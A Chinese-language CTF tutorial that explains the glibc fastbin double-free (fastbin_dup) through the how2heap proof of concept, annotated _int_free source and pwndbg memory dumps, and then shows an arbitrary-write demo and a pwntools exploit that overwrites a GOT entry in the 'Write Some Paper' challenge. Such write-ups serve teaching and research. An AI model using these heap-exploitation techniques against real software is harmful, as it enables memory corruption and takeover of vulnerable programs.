# 前言
从这一小节开始我们开始讲述各类对堆的攻击方式，当然你可能有疑问在之前并没有了解过free的源码就怎么开始漏洞研究了呢？说的很对，虽然在我很早的文章中说明过一部分的漏洞以利用方式，但是并没有对漏洞成因进行深究；也就是说我们只知道“表面现象”而不知“深层次原因”。所以在之后讲述漏洞的篇章中都会对free源码进行讲解以更深的了解漏洞成因和防御措施。接下来我们转入正题。

# 简介
在我很早的文章中说明过这个漏洞的成因--double free，相关文章链接如下：

[PWN入门（3-7-2）-fastbin_attack中的fastbin_double_free（基础）](https://www.yuque.com/cyberangel/rg9gdm/rb3wx3)

[PWN入门（3-7-3）-fastbin_attack中的fastbin_double_free（例题）](https://www.yuque.com/cyberangel/rg9gdm/tgis8x)

> （现在看来之前写的文章简直是黑历史）
>

当heap段中某一个堆块被进行二次释放就会在bin中形成<font style="color:rgb(51, 51, 51);">circular list（循环链表），严重会导致任意内存读写。</font>

# 漏洞影响版本
所有glibc malloc版本

# POC
> 之后文章如若未有额外说明，则POC来自：
>
> [https://github.com/shellphish/how2heap/tree/master/glibc_2.27](https://github.com/shellphish/how2heap/tree/master/glibc_2.27)
>

## POC源码
```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	setbuf(stdout, NULL);

	printf("This file demonstrates a simple double-free attack with fastbins.\n");

	printf("Fill up tcache first.\n");
	void *ptrs[8];
	for (int i=0; i<8; i++) {
		ptrs[i] = malloc(8);
	}
	for (int i=0; i<7; i++) {
		free(ptrs[i]);
	}

	printf("Allocating 3 buffers.\n");
	int *a = calloc(1, 8);
	int *b = calloc(1, 8);
	int *c = calloc(1, 8);

	printf("1st calloc(1, 8): %p\n", a);
	printf("2nd calloc(1, 8): %p\n", b);
	printf("3rd calloc(1, 8): %p\n", c);

	printf("Freeing the first one...\n");
	free(a);

	printf("If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);

	printf("So, instead, we'll free %p.\n", b);
	free(b);

	printf("Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);

	printf("Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
	a = calloc(1, 8);
	b = calloc(1, 8);
	c = calloc(1, 8);
	printf("1st calloc(1, 8): %p\n", a);
	printf("2nd calloc(1, 8): %p\n", b);
	printf("3rd calloc(1, 8): %p\n", c);

	assert(a == c);
}
```

> POC可以测试系统中是否有此漏洞存在，如果不存在会触发assert断言
>

POC运行效果如下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1618833932458-f32b9dea-64b1-4b7f-a768-7c9669cb3806.png)

## POC分析
> 使用的编译命令：gcc -g fastbin_dup -o fastbin_dup
>

我们主要分析main函数中的代码，首先来看第一部分：

```c
	void *ptrs[8];
	for (int i=0; i<8; i++) {
		ptrs[i] = malloc(8);
	}
	for (int i=0; i<7; i++) {
		free(ptrs[i]);
	}
```

上述代码申请了8个大小为8的堆块，其指针返回到void *ptr[8]中，然后释放前7个堆块，因为这里我们要演示的是fastbin_dup，所以首先要释放7个填满tcachebin：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1618834996719-66fcee1a-6ac1-4ddf-b8fd-ce4bd16db954.png)

```c
pwndbg> x/120gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
0x555555757010:	0x0000000000000007	0x0000000000000000
......
0x555555757050:	0x0000555555757320	0x0000000000000000
......
0x555555757250:	0x0000000000000000	0x0000000000000021 #index1(tcachebin)
0x555555757260:	0x0000000000000000	0x0000555555757010
0x555555757270:	0x0000000000000000	0x0000000000000021 #index2(tcachebin)
0x555555757280:	0x0000555555757260	0x0000555555757010
0x555555757290:	0x0000000000000000	0x0000000000000021 #index3(tcachebin)
0x5555557572a0:	0x0000555555757280	0x0000555555757010
0x5555557572b0:	0x0000000000000000	0x0000000000000021 #index4(tcachebin)
0x5555557572c0:	0x00005555557572a0	0x0000555555757010
0x5555557572d0:	0x0000000000000000	0x0000000000000021 #index5(tcachebin)
0x5555557572e0:	0x00005555557572c0	0x0000555555757010
0x5555557572f0:	0x0000000000000000	0x0000000000000021 #index6(tcachebin)
0x555555757300:	0x00005555557572e0	0x0000555555757010
0x555555757310:	0x0000000000000000	0x0000000000000021 #index7(tcachebin)
0x555555757320:	0x0000555555757300	0x0000555555757010
0x555555757330:	0x0000000000000000	0x0000000000000021 #index8(malloc)
0x555555757340:	0x0000000000000000	0x0000000000000000
0x555555757350:	0x0000000000000000	0x0000000000020cb1
......
0x5555557573b0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

牵扯到的_int_free源码如下：

> 这里以第一个free为例子进行说明，由于之前在malloc章节中已经详细说过部分代码，因此在如下的内容中重复的内容会省略或简略说明。
>

```c
static void
_int_free (mstate av, mchunkptr p, int have_lock)
{	//p是要free的堆块的指针
	//......（一些变量的定义省略）
	//p= (mchunkptr) 0x555555757250
  size = chunksize (p);  //size==0x20

  /* Little security check which won't hurt performance: the
     allocator never wrapps around at the end of the address space.
     Therefore we can exclude some size values which might appear
     here by accident or by "design" from some intruder.  */
  if (__builtin_expect ((uintptr_t) p > (uintptr_t) -size, 0)
      || __builtin_expect (misaligned_chunk (p), 0))
    malloc_printerr ("free(): invalid pointer"); //检查p指针是否有效
  /* We know that each chunk is at least MINSIZE bytes in size or a
     multiple of MALLOC_ALIGNMENT.  */
  if (__glibc_unlikely (size < MINSIZE || !aligned_OK (size)))
    malloc_printerr ("free(): invalid size"); 
    	//检查p的大小是否有效:
    	//1、堆块的大小不能小于最小分配大小
    	//2、堆块的必须是MALLOC_ALIGN_MASK（堆块大小的最小对齐单位）的整数倍

  check_inuse_chunk(av, p); 

#if USE_TCACHE
  {
    size_t tc_idx = csize2tidx (size); //tc_idx==0
    if (tcache != NULL && tc_idx < mp_.tcache_bins)
      {//要求tcachebin已经初始化并且p在tcachebin链表范围内
	/* Check to see if it's already in the tcache.  */
	tcache_entry *e = (tcache_entry *) chunk2mem (p);//将堆块起始地址转化为指向user_data
		//p==0x555555757250;e==0x555555757260
	/* This test succeeds on double free.  However, we don't 100%
	   trust it (it also matches random payload data at a 1 in
	   2^<size_t> chance), so verify it's not an unlikely
	   coincidence before aborting.  */
	if (__glibc_unlikely (e->key == tcache)) //检查p的key标志位
	  {//if语句中的内容会检查是否发生了double free
       //如果p的key标志位已经设置，我们有理由怀疑发生了double free，接下来要证明这一点
	    tcache_entry *tmp;
	    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
	    for (tmp = tcache->entries[tc_idx]; //获取tcachebin中的最后一个进入的free chunk
		 tmp;	//判断循环终止条件：tmp堆块是否为NULL
		 tmp = tmp->next) //获取tmp的next指针，也就是下一个chunk
	      if (tmp == e) //如果bin中有两个相同的chunk，则说明发生了double free
		malloc_printerr ("free(): double free detected in tcache 2"); //触发异常
	    /* If we get here, it was a coincidence.  We've wasted a
	       few cycles, but don't abort.  */
	  }
	//现在此堆块正常，我们要将其放入到对应的tcachebin中
	if (tcache->counts[tc_idx] < mp_.tcache_count)
	  {
	    tcache_put (p, tc_idx);
	    return;
	  }
      }
  }
#endif
```

上面的源码中有一部分很有意思：

```c
	if (__glibc_unlikely (e->key == tcache)) //检查p的key标志位
	  {//if语句中的内容会检查是否发生了double free
       //如果p的key标志位已经设置，我们有理由怀疑发生了double free，接下来要证明这一点
	    tcache_entry *tmp;
	    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
	    for (tmp = tcache->entries[tc_idx]; //获取tcachebin中的最后一个进入的free chunk
		 tmp;	//判断循环终止条件：tmp堆块是否为NULL
		 tmp = tmp->next) //获取tmp的next指针，也就是下一个chunk
	      if (tmp == e) //如果bin中有两个相同的chunk，则说明发生了double free
		malloc_printerr ("free(): double free detected in tcache 2"); //触发异常
	    /* If we get here, it was a coincidence.  We've wasted a
	       few cycles, but don't abort.  */
	  }
```

进入此if语句我们需要e->key==tcache，当进入此if语句时我们可以怀疑p这个堆块发生了double free，但是现在不是很确定，因为在释放前堆块的user data中的是有内容的，也就是说p的key标志位处很可能有数据，假如说这个数据恰好是tcache_perthread_struct+0x10（tcache）呢：

```c
#include<stdio.h>
#include<stdlib.h>
int main(){
	setbuf(stdout,NULL);
	setbuf(stdin,NULL);
	void *p=malloc(0x10);
	read(0,p,0x20);//0x0000555555756010
	free(p);
	return 0;
}
```

> 编辑命令：gcc -g test -o test（调试时关闭ALSR）
>

为了方便交互，我还写了一个脚本：

```python
from pwn import *
context.log_level='debug'
p=process('./test')
gdb.attach(p,'b 9')
p.send('a'*8+p64(0x0000555555756010))
p.interactive()
```

运行此脚本后我们finish后直接跳到断点处，然后引入malloc源码进入free开始调试：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1618880477587-f35d04ae-2ed4-4e0e-ad65-a322d5d429e5.png)

现在进入了if语句，但是是否发生了double free还需要if语句中的for循环来确定：

```python
	    for (tmp = tcache->entries[tc_idx]; //获取tcachebin中的最后一个进入的free chunk
		 tmp;	//判断循环终止条件：tmp堆块是否为NULL
		 tmp = tmp->next) //获取tmp的next指针，也就是下一个chunk
	      if (tmp == e) //如果bin中有两个相同的chunk，则说明发生了double free
		malloc_printerr ("free(): double free detected in tcache 2"); //触发异常
```

在这个for循环中会对对应大小的tcachebin进行遍历，要触发异常我们的chunk必须在tcachebin中，这也就避免来堆块中的用户数据影响堆块的释放过程：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1618880892332-827db2eb-b12d-4d83-9af3-25ce4fdb3928.png)

额，扯的好像有点远了，我们继续来看POC：

```c
	printf("Allocating 3 buffers.\n");
	int *a = calloc(1, 8);
	int *b = calloc(1, 8);
	int *c = calloc(1, 8);
```

> calloc(1, 8)：在堆中分配1个长度为8的连续空间
>
> calloc申请堆块不会向tcachebin中申请堆块，具体原因可以看之前malloc文章或malloc源码
>

结果如下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1618881585474-a155debb-0127-4e6d-bbd4-75b4c765137d.png)

```c
pwndbg> x/120gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
0x555555757010:	0x0000000000000007	0x0000000000000000
......
0x555555757050:	0x0000555555757320	0x0000000000000000
......
0x555555757250:	0x0000000000000000	0x0000000000000021 #index1(tcachebin)
0x555555757260:	0x0000000000000000	0x0000555555757010
0x555555757270:	0x0000000000000000	0x0000000000000021 #index2(tcachebin)
0x555555757280:	0x0000555555757260	0x0000555555757010
0x555555757290:	0x0000000000000000	0x0000000000000021 #index3(tcachebin)
0x5555557572a0:	0x0000555555757280	0x0000555555757010
0x5555557572b0:	0x0000000000000000	0x0000000000000021 #index4(tcachebin)
0x5555557572c0:	0x00005555557572a0	0x0000555555757010
0x5555557572d0:	0x0000000000000000	0x0000000000000021 #index5(tcachebin)
0x5555557572e0:	0x00005555557572c0	0x0000555555757010
0x5555557572f0:	0x0000000000000000	0x0000000000000021 #index6(tcachebin)
0x555555757300:	0x00005555557572e0	0x0000555555757010
0x555555757310:	0x0000000000000000	0x0000000000000021 #index7(tcachebin)
0x555555757320:	0x0000555555757300	0x0000555555757010
0x555555757330:	0x0000000000000000	0x0000000000000021 #index8(malloc)
0x555555757340:	0x0000000000000000	0x0000000000000000
0x555555757350:	0x0000000000000000	0x0000000000000021 #index9(calloc)
0x555555757360:	0x0000000000000000	0x0000000000000000
0x555555757370:	0x0000000000000000	0x0000000000000021 #index10(calloc)
0x555555757380:	0x0000000000000000	0x0000000000000000
0x555555757390:	0x0000000000000000	0x0000000000000021 #index11(calloc)
0x5555557573a0:	0x0000000000000000	0x0000000000000000
0x5555557573b0:	0x0000000000000000	0x0000000000020c51 #top_chunk
pwndbg> 
```

接下来我们会将申请的index9、index10依次按顺序释放：

```c
	free(a);
	free(b); //避免触发异常：fastbin double free
	free(a);
```

> 个人猜测：为什么不在fastbin对double free进行和tcache一样的检查机制？
>
> 在tcachebin中每一条链上都有且最多有7个free chunk，在对相应的链表进行检查时free chunk的堆块数目较少，基本上不会拖慢程序的运行速度；而fastbin就不一样了，其每条链表上的堆块数目没有限制，若链上的chunk过多并且依照tcachebin增加类似的检查机制，在for循环中会极大的降低程序的运行效率。
>

其中堆块进入fastbin的过程源码如下：

```c
  /*
    If eligible, place chunk on a fastbin so it can be found
    and used quickly in malloc.
  */ //如果符合条件，为了在malloc时迅速找到符合条件的堆块，我们会将其放入到fastbin中

  if ((unsigned long)(size) <= (unsigned long)(get_max_fast ()) //global_max_fast()==0x80
		//判断chunk是否可以放入fastbin中
#if TRIM_FASTBINS 
      //TRIM_FASTBINS默认值为0：当某个chunk与top_chunk相邻，
      //在free此堆块时选择是否进入fastbin，为0时不会和top_chunk合并而进入fastbin
      //为1时会与top_chunk合并。
      /*
	If TRIM_FASTBINS set, don't place chunks
	bordering top into fastbins
      */
      && (chunk_at_offset(p, size) != av->top) //判断下一个chunk是否为top_chunk
      		//上面这个判断条件在TRIM_FASTBINS==0时是没有意义的
#endif
      ) {
	//接下来开始检查与chunk相邻的下一个chunk大小是否很离谱
    //（为了叙述方便这里我们称之为nextchunk）
    if (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))
			  <= 2 * SIZE_SZ, 0)  
	|| __builtin_expect (chunksize (chunk_at_offset (p, size))
			     >= av->system_mem, 0))
      {//nextsize<=2 * SIZE_SZ或nextsize>=system_mem(详细内容请见之前的malloc文章)
	bool fail = true;
	/* We might not have a lock at this point and concurrent modifications
	   of system_mem might result in a false positive.  Redo the test after
	   getting the lock.  */
	if (!have_lock) //有关多线程，这里不过多说明
	  {
	    __libc_lock_lock (av->mutex);
	    fail = (chunksize_nomask (chunk_at_offset (p, size)) <= 2 * SIZE_SZ
		    || chunksize (chunk_at_offset (p, size)) >= av->system_mem);
	    __libc_lock_unlock (av->mutex);
	  }

	if (fail) //nextsize大小异常，触发malloc_printerr
	  malloc_printerr ("free(): invalid next size (fast)");
      }

    free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); 
      	//chunk2mem(p)指向user_data，
      	//free_perturb函数的作用是将user_data填充为perturb_byte(也就是0)

    atomic_store_relaxed (&av->have_fastchunks, true); 
      	//将av->have_fastchunks设置为true（1）
      	//av->have_fastchunks表示fastbin中是否有free chunk，其值只有1和0
    unsigned int idx = fastbin_index(size); //获取fastbin index
    fb = &fastbin (av, idx);	//获取main_arena指针

    /* Atomically link P to its fastbin: P->FD = *FB; *FB = P;  */
    mchunkptr old = *fb, old2; //old指向此时链表中最后插入fastbin的地址
      						   //当第一次向fastbin插入堆块时*old==NULL

    if (SINGLE_THREAD_P) //我们只看单线程
      {
	/* Check that the top of the bin is not the record we are going to
	   add (i.e., double free).  */
	if (__builtin_expect (old == p, 0)) //检查fastbin double free的代码，易绕过
	  malloc_printerr ("double free or corruption (fasttop)");
    //以下两条代码是插入fastbin的核心过程
	p->fd = old;  //将p的fd设置为old（插入fastbin链表）
	*fb = p; //设置main_arena中的地址为p（设置fastbinY[idx] entry）
      }
    else
		//......（多线程内容省略）

    /* Check that size of fastbin chunk at the top is the same as
       size of the chunk that we are adding.  We can dereference OLD
       only if we have the lock, otherwise it might have already been
       allocated again.  */
    if (have_lock && old != NULL //单线程默认have_lock==0
	&& __builtin_expect (fastbin_index (chunksize (old)) != idx, 0)) //多线程检查fastbin old chunk大小是否正常
      malloc_printerr ("invalid fastbin entry (free)"); //单线程会在malloc此堆块时进行检查。
  }
```

> **<font style="color:#F5222D;">总结：在释放free时优先级(堆块大小小于0x80)：tcachebin>fastbin>与top_chunk合并</font>**
>
> **<font style="color:#F5222D;">（其实这里压根没有top_chunk的事，因为fastbin链表上的chunk可以是无限的）</font>**
>

回到程序中，free掉三个堆块后的情况如下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1618890937427-22c0aa57-127c-47bc-b941-25fc62ab73f9.png)

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1618891052682-44b46340-ebe7-439e-bc93-10292333c629.png)

```c
pwndbg> x/120gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
0x555555757010:	0x0000000000000007	0x0000000000000000
......
0x555555757050:	0x0000555555757320	0x0000000000000000
......
0x555555757250:	0x0000000000000000	0x0000000000000021 #index1(tcachebin)
0x555555757260:	0x0000000000000000	0x0000555555757010
0x555555757270:	0x0000000000000000	0x0000000000000021 #index2(tcachebin)
0x555555757280:	0x0000555555757260	0x0000555555757010
0x555555757290:	0x0000000000000000	0x0000000000000021 #index3(tcachebin)
0x5555557572a0:	0x0000555555757280	0x0000555555757010
0x5555557572b0:	0x0000000000000000	0x0000000000000021 #index4(tcachebin)
0x5555557572c0:	0x00005555557572a0	0x0000555555757010
0x5555557572d0:	0x0000000000000000	0x0000000000000021 #index5(tcachebin)
0x5555557572e0:	0x00005555557572c0	0x0000555555757010
0x5555557572f0:	0x0000000000000000	0x0000000000000021 #index6(tcachebin)
0x555555757300:	0x00005555557572e0	0x0000555555757010
0x555555757310:	0x0000000000000000	0x0000000000000021 #index7(tcachebin)
0x555555757320:	0x0000555555757300	0x0000555555757010
0x555555757330:	0x0000000000000000	0x0000000000000021 #index8(malloc)
0x555555757340:	0x0000000000000000	0x0000000000000000
0x555555757350:	0x0000000000000000	0x0000000000000021 #index9(fastbin)
0x555555757360:	0x0000555555757370	0x0000000000000000
0x555555757370:	0x0000000000000000	0x0000000000000021 #index10(fastbin)
0x555555757380:	0x0000555555757350	0x0000000000000000
0x555555757390:	0x0000000000000000	0x0000000000000021 #index11(malloc)
0x5555557573a0:	0x0000000000000000	0x0000000000000000
0x5555557573b0:	0x0000000000000000	0x0000000000020c51 #top_chunk
pwndbg> 
```

现在fastbin中的0x20链表中形成了double free，我们重新申请堆块：

```c
	printf("Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a); 
	a = calloc(1, 8); //重新向fastbin申请三个堆块
	b = calloc(1, 8);
	c = calloc(1, 8);
	assert(a == c);
```

申请fastbin的具体过程就不说了，感兴趣可以参考之前的malloc文章，a和c指向的地址一定是相同的：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1618901126491-69532906-d1c0-42d0-8b16-a853620785c4.png)

# 利用方式
```c
#include<stdio.h>
#include<stdlib.h>
#include<stdio.h>
typedef struct _chunk
{
    long long pre_size;
    long long size;
    long long fd;
    long long bk;  
} CHUNK,*PCHUNK;

CHUNK bss_chunk;

int main(){
    setbuf(stdout,NULL); //关闭输出缓冲区
    setbuf(stdin,NULL);  //关闭输入缓冲区
    void *q[8]={0};
    void *chunk1,*chunk2,*chunk3;
    void *chunk_a,*chunk_b;
    for(int i = 0 ; i < 8 ;i++){
		q[i]=malloc(0x10);
    }
    for(int i = 0 ; i < 7 ;i++){
		free(q[i]);  //填充tcachebin
    }
    bss_chunk.size=0x21;
    chunk1=calloc(1,0x10); //申请堆块
    chunk2=calloc(1,0x10); //申请堆块

    free(chunk1); //double free
    free(chunk2);
    free(chunk1);
		//chunk1->chunk2->chunk1
    chunk_a=calloc(1,0x10); //申请chunk1后，现在chunk1可写：chunk2->chunk1->bss_chunk
    *(long long *)chunk_a=&bss_chunk; //更改chunk1的fd指针
    calloc(1,0x10); //申请chunk2
    calloc(1,0x10); //申请chunk1
    chunk_b=calloc(1,0x10); //申请bss_chunk
    printf("%p\n",chunk_b); //达到控制任意内存地址
    return 0;
}
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1618904686761-356d7c1a-5998-4d85-8068-8a57a32cd871.png)

再经过第34行代码之后，chunk1处于“薛定谔状态”，我们将chunk1称之为“薛定谔堆块”，也就是说chunk1即存在malloc状态又存在free状态（不好意思，这个概念我编的），一个小总结如下：

不要只考虑使用fastbin dup，如果某个堆块free一次后其fd指针仍可篡改，直接篡改为target然后malloc两次就行了，总之要灵活pwn，一个例子如下：

[PWN入门（3-7-3）-fastbin_attack中的fastbin_double_free（例题）](https://www.yuque.com/cyberangel/rg9gdm/tgis8x)

iscc 2018 Write Some Paper：glibc 2.23

```python
from pwn import *
context.log_level='debug'

'''
    Arch:     amd64-64-little 
    RELRO:    Partial RELRO #我们可以覆写got.plt表（即got表）
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
'''
#open partial relro ,so wo can overwrite got.plt
p=process('./paper')
elf=ELF('./paper')
def choose(choice):
    p.sendline(str(choice))
def add_paper(index,size,content):
    choose(1)
    p.recvuntil('Input the index you want to store(0-9):')
    p.sendline(str(index))
    p.recvuntil('How long you will enter:')
    p.sendline(str(size))
    p.recvuntil('please enter your content:')
    p.sendline(str(content))
def delete_paper(index):
    choose(2)
    p.recvuntil("which paper you want to delete,please enter it's index(0-9):")
    p.sendline(str(index))

add_paper(0,0x30,'aaaa')
add_paper(1,0x30,'bbbb')

delete_paper(0) #double free
delete_paper(1)
delete_paper(0)

system_addr=elf.symbols['gg'] #get system(gg function) addr
puts_got_addr=elf.got['puts'] #get puts.got.plt addr
print hex(elf.plt['puts']) #0x400720
log.success("get system_addr : "+hex(system_addr))
log.success("puts_got_addr : "+hex(puts_got_addr)) #puts@got.plt==0x602020
'''
pwndbg> x/16gx 0x400720
0x400720 <puts@plt>:	0x0168002018fa25ff	0xffffffd0e9000000
0x400730 <fread@plt>:	0x0268002018f225ff	0xffffffc0e9000000
0x400740 <__stack_chk_fail@plt>:	0x0368002018ea25ff	0xffffffb0e9000000
0x400750 <system@plt>:	0x0468002018e225ff	0xffffffa0e9000000
0x400760 <printf@plt>:	0x0568002018da25ff	0xffffff90e9000000
0x400770 <__libc_start_main@plt>:	0x0668002018d225ff	0xffffff80e9000000
0x400780 <__gmon_start__@plt>:	0x0768002018ca25ff	0xffffff70e9000000
0x400790 <strtol@plt>:	0x0868002018c225ff	0xffffff60e9000000
pwndbg> x/16gx 0x602020
0x602020 <puts@got.plt>:	0x00007ffff7a7c6a0	0x00007ffff7a7b1b0
0x602030 <__stack_chk_fail@got.plt>:	0x0000000000400746	0x0000000000400756
0x602040 <printf@got.plt>:	0x00007ffff7a62810	0x00007ffff7a2d750
0x602050 <__gmon_start__@got.plt>:	0x0000000000400786	0x00007ffff7a483d0
0x602060 <malloc@got.plt>:	0x00007ffff7a91180	0x00007ffff7a7ce80
0x602070 <__isoc99_scanf@got.plt>:	0x00007ffff7a784e0	0x00000000004007d6
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000000	0x0000000000000000
pwndbg> 
'''
victim_addr=puts_got_addr+0xa
add_paper(2,0x30,p64(victim_addr))
add_paper(3,0x30,'cccc')
add_paper(4,0x30,'dddd')
gdb.attach(p)
add_paper(5,0x30,"\x40\x00\x00\x00\x00\x00"+p64(system_addr)) #overwrite printf@got.plt
															  #复写got表并防止system@got.plt被破坏
p.sendline('Cyberangel')
p.interactive()
```

